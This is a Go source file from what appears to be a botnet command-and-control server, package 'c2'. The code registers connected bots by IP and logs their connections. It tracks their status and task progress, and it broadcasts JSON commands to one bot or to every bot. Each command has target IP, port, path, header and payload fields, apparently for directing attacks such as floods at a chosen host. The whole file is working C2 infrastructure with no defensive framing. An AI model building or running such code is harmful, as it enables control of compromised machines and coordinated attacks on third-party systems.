package bot

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"c2/config"
)

// BotInfo stores information about the bot
type BotInfo struct {
	Conn           net.Conn
	ConnectTime    time.Time
	LastActive     time.Time
	DisconnectTime time.Time
	Status         string
	CurrentTask    string
}

var (
	// Bots stores all connected bots
	Bots = make(map[string]*BotInfo)
	// BotMu protects concurrent access to Bots
	BotMu sync.Mutex
)

// HandleNewBot handles a new bot connection
func HandleNewBot(conn net.Conn) {
	botIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()
	now := time.Now()

	bot := &BotInfo{
		Conn:        conn,
		ConnectTime: now,
		LastActive:  now,
		Status:      "Online",
	}

	BotMu.Lock()
	Bots[botIP] = bot
	BotMu.Unlock()

	LogConnection(botIP)
	fmt.Printf("[+] New bot connected: %s\n", botIP)

	go MonitorBotConnection(bot, botIP)
}

// MonitorBotConnection monitors the bot connection and processes messages
func MonitorBotConnection(bot *BotInfo, botIP string) {
	defer func() {
		bot.Conn.Close()
		BotMu.Lock()
		bot.Status = "Offline"
		bot.DisconnectTime = time.Now()
		BotMu.Unlock()
		fmt.Printf("[!] Bot disconnected: %s\n", botIP)
	}()

	reader := bufio.NewReader(bot.Conn)
	for {
		msg, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		BotMu.Lock()
		bot.LastActive = time.Now()
		ProcessBotMessage(bot, msg)
		BotMu.Unlock()

		fmt.Printf("[%s] Status update: %s", botIP, msg)
	}
}

// ProcessBotMessage processes messages from the bot
func ProcessBotMessage(bot *BotInfo, msg string) {
	msg = strings.TrimSpace(msg)
	switch {
	case msg == "TASK_COMPLETE":
		bot.Status = "Online"
		bot.CurrentTask = ""
	case msg == "STOP":
		bot.Status = "Idle"
		bot.CurrentTask = ""
	case strings.HasPrefix(msg, "TASK_PROGRESS "):
		bot.CurrentTask = strings.TrimPrefix(msg, "TASK_PROGRESS ")
	}
}

// LogConnection logs the connection to a log file
func LogConnection(ip string) {
	file, err := os.OpenFile(config.LogFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return
	}
	defer file.Close()
	file.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format(time.RFC3339), ip))
}

// SendCommandToBot sends a command to a bot
func SendCommandToBot(bot *BotInfo, command config.BotCommand) bool {
	jsonCommand, err := json.Marshal(command)
	if err != nil {
		fmt.Println("[!] Error marshalling command")
		return false
	}
	_, err = fmt.Fprintf(bot.Conn, "%s\n", jsonCommand)
	if err != nil {
		bot.Status = "Offline"
		return false
	}
	return true
}

// SendBotCommand sends a command to one or all bots
func SendBotCommand(command config.BotCommand, botIP string) {
	BotMu.Lock()
	defer BotMu.Unlock()

	sent := 0
	if botIP != "" {
		if bot, exists := Bots[botIP]; exists && bot.Status == "Online" {
			// Send command directly
			if SendCommandToBot(bot, command) {
				bot.Status = "Online"
				bot.CurrentTask = command.Method
				sent++
			}
		} else {
			fmt.Printf("[!] Specified bot unavailable: %s\n", botIP)
			return
		}
	} else {
		for _, bot := range Bots {
			if bot.Status == "Online" {
				if SendCommandToBot(bot, command) {
					bot.CurrentTask = command.Method
					sent++
				}
			}
		}
	}

	fmt.Printf("\n[+] Successfully sent command to %d bots\n", sent)
}

// SendStopToAllBots sends a stop command to all online bots
func SendStopToAllBots() {
	BotMu.Lock()
	defer BotMu.Unlock()

	command := config.BotCommand{
		Method:  "STOP",
		IP:      "",
		Port:    0,
		Path:    "",
		Header:  "",
		Payload: "",
	}

	sentCount := 0
	for _, bot := range Bots {
		if bot.Status == "Online" {
			SendCommandToBot(bot, command)
			sentCount++
		}
	}
	fmt.Printf("[+] Sent stop command to %d online bots\n", sentCount)
}

// SendStopToSpecificBot sends a stop command to a specific bot
func SendStopToSpecificBot(ip string) {
	BotMu.Lock()
	defer BotMu.Unlock()

	command := config.BotCommand{
		Method:  "STOP",
		IP:      "",
		Port:    0,
		Path:    "",
		Header:  "",
		Payload: "",
	}

	if bot, exists := Bots[ip]; exists && bot.Status == "Online" {
		SendCommandToBot(bot, command)
		fmt.Printf("[+] Sent stop command to %s\n", ip)
	} else {
		fmt.Printf("[!] %s is not online or doesn't exist\n", ip)
	}
}
